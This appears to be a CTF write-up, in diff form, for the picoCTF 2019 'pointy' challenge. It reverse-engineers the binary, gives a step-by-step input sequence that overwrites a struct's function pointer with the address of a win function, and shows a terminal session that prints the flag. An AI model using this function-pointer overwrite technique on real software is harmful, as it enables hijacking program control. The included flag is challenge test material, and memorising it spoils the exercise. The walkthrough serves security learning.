@@ -1,1 +1,100 @@
+ELF 32-bit, dinamicaly-linked.
+no PIE which means the addresses of functions in the program are static.
+
 maybe you can use the function giveScoreToProfessor() to set the value stored in the student pointer.
+
+
+int main(int argc, char **argv):
+
+loops for a given global variable called ADRESSES_TAKEN, compared with 0x3e6 == 998
+
+while ADDRESSES_TAKEN <= 998
+{
+	puts("Input the name of a student");
+	pointer_student_struct = malloc(0x84);
+	ADDRESSES[ADDRESSES_TAKEN] = pointer_student_struct;
+	readLIne(&(pointer_student_struct->name));
+
+	puts("Input the name of the favorite proffessor")
+	pointer_prof_struct = malloc(0x84);
+	ADDRESSES[ADDRESSES_TAKEN+1] = pointer_prof_struct;
+	readLine(&(pointer_prof_struct->name));
+
+	pointer_student_struct->func = &giveScoreToProfessor;
+	ADDRESSES_TAKEN += 2;
+
+	puts("Input the name of the student that will");
+	readLine(var_10);
+
+	pointer_student_struct = retrieveStudent(&var_10);
+
+	puts("Input the name of the professor that will");
+	readLine(var_8c);
+
+	pointer_prof_struct = retrieveProfessor(&var_8c);
+
+	puts(pointer_prof_struct->name);
+	puts("Input the score: ")
+	scanf("%u", &var_118);
+
+	pointer_student_struct->func(pointer_prof_struct, var_118);
+}
+
+ADRESSES:
+[
+stud1,
+prof1,
+
+
+]
+
+void readLine(void *buffer):
+Reads 0x7f bytes from stdin, and stores it in the given buffer.
+Then null-terminates the string stored in the buffer.
+
+void * retrieveProfessor(char *name):
+	* should return a struct, based on name.
+	* should in theory return a student struct if its name is the name searched.
+
+program use order:
+1. insert student named "a"
+2. insert professor named "b"
+3. choose "a" to give score.
+4. choose "a" as professor to get grade.
+5. give address in decimal of win as grade. (0x08048696 == 134514326)
+6. insert student named "c"
+7. insert professor named "d"
+8. choose "a" to give score.
+9. choose "b" as professor to get grade.
+10. give random value.
+
+
+
+tomteam@pico-2019-shell1:/problems/pointy_0_4da9845cb7c41585de522db47f569424$ ./vuln
+Input the name of a student
+a
+Input the name of the favorite professor of a student 
+b
+Input the name of the student that will give the score 
+a
+Input the name of the professor that will be scored 
+a
+a
+Input the score: 
+134514326
+Score Given: 134514326 
+Input the name of a student
+c
+Input the name of the favorite professor of a student 
+d
+Input the name of the student that will give the score 
+a
+Input the name of the professor that will be scored 
+b
+b
+Input the score: 
+10
+picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}
+Input the name of a student
+
+It Worked!!!!!!!!!!!
